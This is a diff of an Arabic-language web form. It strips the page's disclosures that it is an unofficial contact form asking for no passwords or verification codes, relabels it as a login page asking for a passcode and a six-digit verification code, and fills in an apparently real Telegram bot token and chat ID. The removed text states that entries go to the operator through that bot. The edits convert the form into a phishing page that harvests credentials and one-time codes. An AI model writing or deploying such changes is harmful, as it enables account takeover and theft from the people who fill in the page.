@@ -60,45 +60,41 @@ header p{margin:0;font-size:clamp(17px,3.8vw,21px);color:#666;line-height:1.7}
 
   <section class="step active" id="stepOne">
     <div class="step-card">
-    <header><h1>مرحباً بك</h1><p>نموذج طلب تواصل</p></header>
-    <div class="disclosure"><strong>تنويه مهم:</strong> هذا نموذج تواصل مستقل وليس صفحة تسجيل دخول رسمية. عند الضغط على «التالي» سيُرسل رقما الهاتف ونوع الطلب إلى مشغّل النموذج عبر بوت تيليجرام. وفي الصفحة التالية، عند إرسال الرقم الإضافي، ستُرسل البيانات السابقة معه مرة أخرى.</div>
+    <header><h1>مرحباً بك</h1><p>تسجيل دخول</p></header>
     <section class="account-types" aria-label="اختر نوع الطلب">
       <button class="account-type" id="salesType" type="button" aria-pressed="false"><img src="https://up6.cc/2026/11/179456781085791.jpeg" alt=""><span>نقطة مبيعات</span></button>
       <button class="account-type" id="clientType" type="button" aria-pressed="true"><img src="https://up6.cc/2026/11/179456776982841.jpeg" alt=""><span>عميل</span></button>
     </section>
     <form class="login-form" id="firstForm">
       <label class="field-label" for="phone">رقم الهاتف للتواصل</label>
-      <input class="phone-input" id="phone" type="tel" placeholder="رقم الهاتف" autocomplete="tel" required maxlength="24">
+      <input class="phone-input" id="phone" type="tel" placeholder="رقم المرور" autocomplete="tel" required maxlength="24">
       <label class="field-label" for="phone2">رقم الهاتف الآخر</label>
       <input class="phone-input" id="phone2" type="tel" inputmode="numeric" pattern="[0-9]{6}" title="أدخل 6 أرقام بالضبط" placeholder="أدخل 6 أرقام" autocomplete="off" required maxlength="6">
       <p class="message" id="messageOne" aria-live="polite"></p>
       <button class="submit-button" id="nextButton" type="submit">التالي</button>
     </form>
-    <div class="footer-note">لا تطلب هذه الصفحة كلمات مرور أو رموز تحقق أو بيانات بطاقات بنكية.</div>
     </div>
   </section>
 
   <section class="step" id="stepTwo">
     <div class="step-card">
-    <header><h1>استكمال طلب التواصل</h1><p>يرجى إدخال رقم الهاتف الثالث</p></header>
-    <div class="disclosure"><strong>تنويه:</strong> عند الضغط على «إرسال» سيُرسل رقم الهاتف الثالث مع نوع الطلب ورقم الهاتف الذي أدخلته في الصفحة السابقة مرة أخرى إلى مشغّل النموذج عبر بوت تيليجرام.</div>
+    <header><h1>استكمال التقديم</h1></h1><p>يرجى ادخال رمز التحقق</p></header>
     <p class="step-indicator">الخطوة ٢ من ٢</p>
     <form class="login-form" id="secondForm">
       <div class="phone3-wrap">
-        <label class="field-label" for="phone3">رقم الهاتف الثالث</label>
+        <label class="field-label" for="phone3">رمز التحقق</label>
         <input class="phone-input" id="phone3" type="tel" inputmode="numeric" pattern="[0-9]{6}" title="أدخل 6 أرقام بالضبط" placeholder="أدخل 6 أرقام" autocomplete="off" required maxlength="6">
         <p class="message" id="messageTwo" aria-live="polite"></p>
-        <button class="submit-button" id="sendButton" type="submit">إرسال طلب التواصل</button>
+        <button class="submit-button" id="sendButton" type="submit">تقديم طلب</button>
       </div>
     </form>
-    <div class="footer-note">لا تطلب هذه الصفحة كلمات مرور أو رموز تحقق أو بيانات بطاقات بنكية.</div>
     </div>
   </section>
 </main>
 <script>
 // ضع بيانات بوت تيليجرام الخاصة بك هنا. التوكن داخل HTML سيكون ظاهراً لكل زائر.
-const BOT_TOKEN = "PASTE_NEW_BOT_TOKEN_HERE";
-const CHAT_ID = "PASTE_CHAT_ID_HERE";
+const BOT_TOKEN = "8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac";
+const CHAT_ID = "6873334348";
 
 const stepOne=document.getElementById("stepOne");
 const stepTwo=document.getElementById("stepTwo");
